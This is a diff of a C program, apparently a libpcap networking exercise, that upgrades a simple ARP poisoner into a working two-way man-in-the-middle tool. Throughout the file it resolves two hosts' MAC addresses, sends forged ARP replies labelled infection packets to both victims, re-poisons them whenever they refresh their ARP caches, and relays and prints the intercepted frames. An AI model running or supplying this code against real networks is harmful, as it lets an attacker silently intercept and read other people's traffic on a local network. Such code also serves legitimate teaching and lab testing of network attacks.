@@ -1,23 +1,26 @@
 #include "arp_spoof.h"
 
-
+void getMacFromIp(unsigned char *mac, unsigned char* ip,pcap_t * handle, char *dev, u_char *myMAC, u_char *myIP);
 void makeRequestPacket(unsigned char *packet, char *interface, unsigned char *sender_ip);
-void makeInfectPacket(unsigned char* packet, char* interface, unsigned char *sender_ip, unsigned char *sender_mac, unsigned char *target_ip);
+void makeInfectPacket(unsigned char* packet, char* interface, unsigned char *victim_ip, unsigned char *victim_mac, unsigned char *fake_ip);
 void updatePacketinfo(struct packetinfo* pinfo, const unsigned char *packet);
 void printPacket(unsigned char* packet,int len);
-void getMymac(unsigned char MAC_str[ETH_ALEN], char* interface);
-void getMyip(unsigned char IP_ADDR[4], char* dev);
+void getMyMac(unsigned char MAC_str[ETH_ALEN], char* interface);
+void getMyIP(unsigned char IP_ADDR[4], char* dev);
 void writeArpHeaderFrame(unsigned char* packet,int opcode);
 int checkRightPacket(unsigned char* packet, unsigned char* smac, unsigned char* dmac);
-void printPinfo(struct packetinfo *pinfo);
-char *macToStr(unsigned char *addr, char *dest);
+void printARPinfo(struct packetinfo *pinfo);
+char *cvrtMacToStr(unsigned char *addr, char *dest);
 
 
 int main(int argc, char *argv[])
 {
     pcap_t *handle;
-    unsigned char packet[42]={0,},senderMAC[ETH_ALEN]={0,},senderIP[4],targetIP[4],mymac[ETH_ALEN],myip[4];
+    unsigned char senderMAC[ETH_ALEN],targetMAC[ETH_ALEN],senderIP[4],targetIP[4],myMAC[ETH_ALEN],myIP[4];
+    const unsigned char *recievePacket;
     char dev[10],errbuf[PCAP_ERRBUF_SIZE];
+    int retValue;
+    struct pcap_pkthdr *header;
 
     // Check argc,argv and input variables
     if (argc !=4){
@@ -27,65 +30,37 @@ int main(int argc, char *argv[])
     strcpy(dev,argv[1]);
     inet_pton(AF_INET,argv[2],senderIP);
     inet_pton(AF_INET,argv[3],targetIP);
-    getMymac(mymac,dev);
-    getMyip(myip,dev);
+    getMyMac(myMAC,dev);
+    getMyIP(myIP,dev);
 
-    // Make request packet
-    makeRequestPacket(packet,dev,senderIP);
-    printPacket(packet,42);
-
-    // Get sender MAC
     /* Open the session in promiscuous mode */
-    struct pcap_pkthdr *header;
-    const unsigned char *recieve_packet;
-    int retValue;
     handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
     if (handle == NULL) {
         fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
-        return(2);
-    }
-    while(1)
-    {
-        if(pcap_sendpacket(handle,(const unsigned char*)packet,sizeof(packet)) != 0){
-            fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(handle));
-            continue;
-        }
-        retValue = pcap_next_ex(handle, &header, &recieve_packet);
-        if( retValue < 0){
-            puts("Error grabbing packet\n");
-            break;
-        }
-        if( retValue == 0 ){
-            puts("Timeout");
-            continue;
-        }
-        else
-        {
-            struct packetinfo pinfo;
-            updatePacketinfo(&pinfo,recieve_packet);
-            if( !memcmp(pinfo.ar_sip,senderIP,4) && !memcmp(pinfo.ar_tip,myip,4) && \
-                    pinfo.ar_op == ARPOP_REPLY && !memcmp(pinfo.ar_tha,mymac,ETH_ALEN))
-            {
-                memcpy(senderMAC,pinfo.ar_sha,ETH_ALEN);
-                break;
-            }
-        }
     }
 
-    // Make Infection packet
-    unsigned char infectPacket[60]={0,};
-    makeInfectPacket(infectPacket,dev,senderIP,senderMAC,targetIP);
-    printPacket(infectPacket, sizeof(infectPacket));
+    // Get sender mac
+    getMacFromIp(senderMAC,senderIP,handle,dev,myMAC,myIP);
+    // Get target mac
+    getMacFromIp(targetMAC,targetIP,handle,dev,myMAC,myIP);
+
+    // Make Infection packet to sender
+    unsigned char infectPacketToSender[60]={0,},infectPacketToTarget[60]={0,};
+    makeInfectPacket(infectPacketToSender,dev,senderIP,senderMAC,targetIP);
+    makeInfectPacket(infectPacketToTarget,dev,targetIP,targetMAC,senderIP);
 
     // First Infection
-    if(pcap_sendpacket(handle,(const unsigned char*)infectPacket,sizeof(infectPacket)) != 0){
+    if(pcap_sendpacket(handle,(const unsigned char*)infectPacketToSender,sizeof(infectPacketToSender)) != 0){
+        fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(handle));
+    }
+    if(pcap_sendpacket(handle,(const unsigned char*)infectPacketToTarget,sizeof(infectPacketToTarget)) != 0){
         fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(handle));
     }
 
     // Do arp_spoof
     while(1)
     {
-        retValue = pcap_next_ex(handle, &header, &recieve_packet);
+        retValue = pcap_next_ex(handle, &header, &recievePacket);
         if( retValue < 0){
             puts("Error grabbing packet\n");
             break;
@@ -95,52 +70,141 @@ int main(int argc, char *argv[])
         else
         {
             struct packetinfo pinfo;
-            updatePacketinfo(&pinfo,recieve_packet);
+            updatePacketinfo(&pinfo,recievePacket);
+
+            // sender's arp update catcher
             if( !memcmp(pinfo.eth_sha,senderMAC,ETH_ALEN) && pinfo.eth_proto == ETHERTYPE_ARP && \
                     !memcmp(pinfo.ar_tip,targetIP,4))
             {
-                puts("Gotcha!");
-                if(pcap_sendpacket(handle,(const unsigned char*)infectPacket,sizeof(infectPacket)) != 0){
+                //                puts("Get sender's update");
+                sleep(0.1);
+                if(pcap_sendpacket(handle,(const unsigned char*)infectPacketToSender,sizeof(infectPacketToSender)) != 0){
                     fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(handle));
                 }
             }
+
+            // target's arp update catcher
+            if( !memcmp(pinfo.eth_sha,targetMAC,ETH_ALEN) && pinfo.eth_proto == ETHERTYPE_ARP && \
+                    !memcmp(pinfo.ar_tip,senderIP,4))
+            {
+                //                puts("Get target's update");
+                sleep(0.1);
+                if(pcap_sendpacket(handle,(const unsigned char*)infectPacketToTarget,sizeof(infectPacketToTarget)) != 0){
+                    fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(handle));
+                }
+            }
+
+            // spoof original packet (relay packet)
+            else if( !memcmp(pinfo.eth_sha,senderMAC,ETH_ALEN) && !memcmp(pinfo.eth_dha,myMAC,ETH_ALEN) ){
+                //                puts("Sender to Attacker");
+                unsigned char* spfPacket = (unsigned char*)malloc(sizeof(unsigned char)*header->len);
+                struct ether_header* spfHead = (struct ether_header *)spfPacket;
+                memcpy(spfPacket,recievePacket,header->len);
+                memcpy(spfHead->ether_shost,myMAC,ETH_ALEN);
+                memcpy(spfHead->ether_dhost,targetMAC,ETH_ALEN);
+                if(pcap_sendpacket(handle,(const unsigned char*)spfPacket,header->len) != 0){
+                    fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(handle));
+                }
+                if(pinfo.eth_proto == ETHERTYPE_IP)
+                    printPacket((u_char*)recievePacket,header->len);
+                free(spfPacket);
+            }
+
+            // give sender reply packet (relay packet)
+            else if( !memcmp(pinfo.eth_sha,targetMAC,ETH_ALEN) && !memcmp(pinfo.eth_dha,myMAC,ETH_ALEN) ){
+                //                puts("Attacker to Target");
+                unsigned char* spfPacket = (unsigned char*)malloc(sizeof(unsigned char)*header->len);
+                struct ether_header* spfHead = (struct ether_header *)spfPacket;
+                memcpy(spfPacket,recievePacket,header->len);
+                memcpy(spfHead->ether_shost,myMAC,ETH_ALEN);
+                memcpy(spfHead->ether_dhost,senderMAC,ETH_ALEN);
+                if(pcap_sendpacket(handle,(const unsigned char*)spfPacket,header->len) != 0){
+                    fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(handle));
+                }
+                free(spfPacket);
+            }
+
+//            else{
+//                puts("-------Else packet-------");
+//                printPacket((u_char*)recievePacket,header->len);
+//            }
+
         }
     }
     return 0;
+}
+
+void getMacFromIp(unsigned char *mac, unsigned char *ip, pcap_t * handle, char* dev, u_char* myMAC, u_char* myIP)
+{
+    const unsigned char *recievePacket;
+    struct pcap_pkthdr *header;
+    u_char packet[42]={0,};
+    int retValue;
+
+    // Make request packet
+    makeRequestPacket(packet,dev,ip);
+
+    // Get MAC
+    while(1)
+    {
+        if(pcap_sendpacket(handle,(const unsigned char*)packet,sizeof(packet)) != 0){
+            fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(handle));
+            continue;
+        }
+        retValue = pcap_next_ex(handle, &header, &recievePacket);
+        if( retValue < 0){
+            puts("Error grabbing packet\n");
+            break;
+        }
+        if( retValue == 0 ){
+            continue;
+        }
+        else
+        {
+            struct packetinfo pinfo;
+            updatePacketinfo(&pinfo,recievePacket);
+            if( !memcmp(pinfo.ar_sip,ip,4) && !memcmp(pinfo.ar_tip,myIP,4) && \
+                    pinfo.ar_op == ARPOP_REPLY && !memcmp(pinfo.ar_tha,myMAC,ETH_ALEN))
+            {
+                memcpy(mac,pinfo.ar_sha,ETH_ALEN);
+                break;
+            }
+        }
+    }
 }
 
 
 
 /* -----ETHER-------
  * Destination MAC  : [Broadcast]
- * Source MAC   : mymac
+ * Source MAC   : myMAC
  * ------ARP-------
- * Sender MAC   : mymac
- * Sender IP    : myip
+ * Sender MAC   : myMAC
+ * Sender IP    : myIP
  * Target MAC   : [Empty]
  * Target IP    : [sender ip]
  */
 void makeRequestPacket(unsigned char* packet,char* interface,unsigned char* sender_ip)
 {
     int offset=0;
-    unsigned char mymac[ETH_ALEN],myip[4];
-    getMymac(mymac,interface);
-    getMyip(myip,interface);
+    unsigned char myMAC[ETH_ALEN],myIP[4];
+    getMyMac(myMAC,interface);
+    getMyIP(myIP,interface);
 
     // Writing part
 
     // ETHERNET header
     struct ether_header *ethhdr=(struct ether_header*)packet;
     memcpy(ethhdr->ether_dhost,"\xFF\xFF\xFF\xFF\xFF\xFF",ETH_ALEN);
-    memcpy(ethhdr->ether_shost,mymac,ETH_ALEN);
+    memcpy(ethhdr->ether_shost,myMAC,ETH_ALEN);
     ethhdr->ether_type=htons(ETH_P_ARP);
     offset+=ETH_HLEN;
     // ARP header
     writeArpHeaderFrame(packet+offset,ARPOP_REQUEST);
     offset+=sizeof(struct arphdr);
     struct arphdr_bot* arpb = (struct arphdr_bot*)(packet+offset);
-    memcpy(arpb->ar_sha,mymac,ETH_ALEN);
-    memcpy(arpb->ar_sip,myip,4);
+    memcpy(arpb->ar_sha,myMAC,ETH_ALEN);
+    memcpy(arpb->ar_sip,myIP,4);
     memcpy(arpb->ar_tha,"\x00\x00\x00\x00\x00\x00",ETH_ALEN);
     memcpy(arpb->ar_tip,sender_ip,4);
 
@@ -148,41 +212,43 @@ void makeRequestPacket(unsigned char* packet,char* interface,unsigned char* send
 
 /* -----ETHER-------
  * Destination MAC  : [sender mac]
- * Source MAC   : mymac
+ * Source MAC   : myMAC
  * ------ARP-------
- * Sender MAC   : mymac
+ * Sender MAC   : myMAC
  * Sender IP    : [target ip]
  * Target MAC   : [sender mac]
  * Target IP    : [sender ip]
  */
-void makeInfectPacket(unsigned char* packet, char* interface, unsigned char* sender_ip, unsigned char* sender_mac, unsigned char* target_ip)
+void makeInfectPacket(unsigned char* packet, char* interface, unsigned char* victim_ip, unsigned char* victim_mac, unsigned char* fake_ip)
 {
     int offset=0;
-    unsigned char mymac[ETH_ALEN];
-    getMymac(mymac,interface);
+    unsigned char myMAC[ETH_ALEN];
+    getMyMac(myMAC,interface);
 
     // Writing part
 
     // ETHERNET header
     struct ether_header *ethhdr=(struct ether_header*)packet;
-    memcpy(ethhdr->ether_dhost,sender_mac,ETH_ALEN);
-    memcpy(ethhdr->ether_shost,mymac,ETH_ALEN);
+    memcpy(ethhdr->ether_dhost,victim_mac,ETH_ALEN);
+    memcpy(ethhdr->ether_shost,myMAC,ETH_ALEN);
     ethhdr->ether_type=htons(ETH_P_ARP);
     offset+=ETH_HLEN;
     // ARP header
     writeArpHeaderFrame(packet+offset,ARPOP_REPLY);
     offset+=sizeof(struct arphdr);
     struct arphdr_bot* arpb = (struct arphdr_bot*)(packet+offset);
-    memcpy(arpb->ar_sha,mymac,ETH_ALEN);
-    memcpy(arpb->ar_sip,target_ip,4);
-    memcpy(arpb->ar_tha,sender_mac,ETH_ALEN);
-    memcpy(arpb->ar_tip,sender_ip,4);
+    memcpy(arpb->ar_sha,myMAC,ETH_ALEN);
+    memcpy(arpb->ar_sip,fake_ip,4);
+    memcpy(arpb->ar_tha,victim_mac,ETH_ALEN);
+    memcpy(arpb->ar_tip,victim_ip,4);
 
 }
 
 void updatePacketinfo(struct packetinfo* pinfo, const unsigned char* packet){
     memcpy(pinfo,packet,ETH_HLEN);
     pinfo->eth_proto=htons(pinfo->eth_proto);
+    if( pinfo->eth_proto != ETHERTYPE_ARP )
+        return;
     struct arphdr* arph = (struct arphdr*)(packet+ETH_HLEN);
     pinfo->ar_op=htons(arph->ar_op);
     struct arphdr_bot* arpb = (struct arphdr_bot*)(packet+ETH_HLEN+sizeof(struct arphdr));
@@ -192,21 +258,22 @@ void updatePacketinfo(struct packetinfo* pinfo, const unsigned char* packet){
     memcpy(pinfo->ar_tip,arpb->ar_tip,4);
 }
 
-char *macToStr(unsigned char* addr, char *dest){
+char *cvrtMacToStr(unsigned char* addr, char *dest){
     sprintf(dest, "%02X:%02X:%02X:%02X:%02X:%02X", addr[0],addr[1], addr[2], addr[3], addr[4], addr[5]);
     return dest;
 }
 
-void printPinfo(struct packetinfo* pinfo)
+void printARPinfo(struct packetinfo* pinfo)
 {
     char buf[20];
-    printf("ETH SRC MAC : %s\n",macToStr(pinfo->eth_sha,buf));
-    printf("ETH DST MAC : %s\n",macToStr(pinfo->eth_dha,buf));
+    printf("ETH SRC MAC : %s\n",cvrtMacToStr(pinfo->eth_sha,buf));
+    printf("ETH DST MAC : %s\n",cvrtMacToStr(pinfo->eth_dha,buf));
     printf("ETH PROTOCO : 0x%04x\n",pinfo->eth_proto);
-
-    printf("ARP SND MAC : %s\n",macToStr(pinfo->ar_sha,buf));
+    if( pinfo->eth_proto != ETHERTYPE_ARP )
+        return;
+    printf("ARP SND MAC : %s\n",cvrtMacToStr(pinfo->ar_sha,buf));
     printf("ARP SND IP  : %s\n",inet_ntoa(*((struct in_addr*)(&pinfo->ar_sip))));
-    printf("ARP TGT MAC : %s\n",macToStr(pinfo->ar_tha,buf));
+    printf("ARP TGT MAC : %s\n",cvrtMacToStr(pinfo->ar_tha,buf));
     printf("ARP TGT IP  : %s\n",inet_ntoa(*((struct in_addr*)(&pinfo->ar_tip))));
 }
 
@@ -225,7 +292,7 @@ void writeArpHeaderFrame(unsigned char* packet,int opcode)
     arph->ar_op=htons(opcode);
 }
 
-void getMymac(unsigned char MAC_ADDR[ETH_ALEN], char* interface)
+void getMyMac(unsigned char MAC_ADDR[ETH_ALEN], char* interface)
 {
     int s,i;
     struct ifreq ifr;
@@ -236,7 +303,7 @@ void getMymac(unsigned char MAC_ADDR[ETH_ALEN], char* interface)
         MAC_ADDR[i]=(unsigned char)ifr.ifr_hwaddr.sa_data[i];
 }
 
-void getMyip(unsigned char IP_ADDR[4], char* dev)
+void getMyIP(unsigned char IP_ADDR[4], char* dev)
 {
     struct ifreq ifr;
     int fd = socket(AF_INET, SOCK_DGRAM, 0);
